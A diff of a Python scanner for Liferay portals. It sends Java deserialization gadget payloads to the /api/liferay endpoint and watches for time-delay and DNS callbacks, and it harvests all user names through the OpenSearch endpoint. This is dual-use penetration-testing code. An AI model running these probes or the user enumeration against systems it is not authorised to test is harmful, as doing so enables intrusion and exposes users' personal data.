@@ -14,12 +14,10 @@ session = requests.Session()
 session.headers.update({
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})
 
-
 # Fake DNS server to catch query while sending DNS java deserialization payloads
 def catch_dns_query():
+    global sock
     rs = ""
-    time_start = time.time()
-    check = True
     port = 53
     hostname = socket.gethostname()
     my_ip = socket.gethostbyname(hostname)
@@ -51,8 +49,6 @@ def ping_deserialization(url):
                  "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
                  "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
 
-    # list_ping = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
-    #              "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
     for name in list_ping:
         payload = open('core/payload_ping/{}.bin'.format(name), 'rb')
         time.sleep(1)
@@ -69,7 +65,7 @@ def sleep_deserialization(url):
     for name in list_sleep:
         payload = open('core/payload_sleep/{}.bin'.format(name), 'rb')
         rq = session.post(url, data=payload, verify=False)
-        print(name + '-' + str(rq.elapsed.total_seconds()))
+        #  print(name + '-' + str(rq.elapsed.total_seconds()))
         if rq.elapsed.total_seconds() >= 10:
             print('\033[91m' + "    [+] {} lib can be POTENTIAL vulnerable".format(name))
         time.sleep(0.5)
@@ -78,21 +74,18 @@ def sleep_deserialization(url):
 # [LPS-27146] Guests can view names of all Liferay users
 def opensearch(url):
     print('\033[93m' + "[!] OpenSearch Gathering" + '\033[91m')
-    alphabet = ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x',
-                'y']
     user_info = dict()
-    for char in alphabet:
-        rq = session.get(url + "/c/search/open_search?p=1&c=5000&keywords=emailAddress:{}*".format(char),
-                         verify=False, timeout=10)
-        soup = Soup(rq.text, 'xml')
-        entry = soup.find_all("entry")
-        for attr in entry:
-            link_tag = re.match('.*u_i_d=(.*)"', str(attr.find('link')))
-            uid = link_tag.group(1)
-            title_tag = str(attr.find('title'))
-            title = re.sub("<title>", "", title_tag)
-            title = re.sub("</title>", "", title)
-            user_info[uid] = title
+    rq = session.get(url + "/c/search/open_search?p=1&c=5000&keywords=entryClassName:com.liferay.portal.model.User",
+                     verify=False, timeout=10)
+    soup = Soup(rq.text, 'xml')
+    entry = soup.find_all("entry")
+    for attr in entry:
+        link_tag = re.match('.*u_i_d=(.*)"', str(attr.find('link')))
+        uid = link_tag.group(1)
+        title_tag = str(attr.find('title'))
+        title = re.sub("<title>", "", title_tag)
+        title = re.sub("</title>", "", title)
+        user_info[uid] = title
     if user_info is not None:
         for uid in user_info:
             print("UserID: " + uid + " - " + str(user_info[uid]))
@@ -174,7 +167,6 @@ class Scan:
                         if "6.1.0" in version:
                             opensearch(self.url)
                     entry_point1 = self.url + "////api/liferay"
-                    entry_point2 = self.url + "////api/spring"
                     if session.post(entry_point1, timeout=10, verify=False).status_code == 200:
                         print(
                             '\033[93m' + "[!] Liferay API allow POST request - May have [LPS-64441] Java Serialization "
@@ -183,14 +175,14 @@ class Scan:
                             sleep_deserialization(entry_point1)
                         elif self.mode == "dns":
                             ping_deserialization(entry_point1)
-                    elif session.post(entry_point2, timeout=10, verify=False).status_code == 200:
-                        print(
-                            '\033[93m' + "[!] Spring API allow POST request - May have [LPS-64441] Java Serialization "
-                                         "Vulnerability")
-                        if self.mode == "sleep":
-                            sleep_deserialization(entry_point1)
-                        elif self.mode == "dns":
-                            ping_deserialization(entry_point1)
+                    # elif session.post(entry_point2, timeout=10, verify=False).status_code == 200:
+                    #     print(
+                    #         '\033[93m' + "[!] Spring API allow POST request - May have [LPS-64441] Java Serialization "
+                    #                      "Vulnerability")
+                    #     if self.mode == "sleep":
+                    #         sleep_deserialization(entry_point1)
+                    #     elif self.mode == "dns":
+                    #         ping_deserialization(entry_point1)
                     else:
                         print('\033[93m' + "[!] [LPS-64441] Java Serialization Vulnerability")
                         print('\033[93m' + "~> None")
@@ -212,7 +204,8 @@ class Scan:
         except Exception as ex:
             print("[!] Something get error see the log file!")
             logging.error(ex)
-
+        finally:
+            sock.close()
 
 # Generate scan object
 def scan_choose():
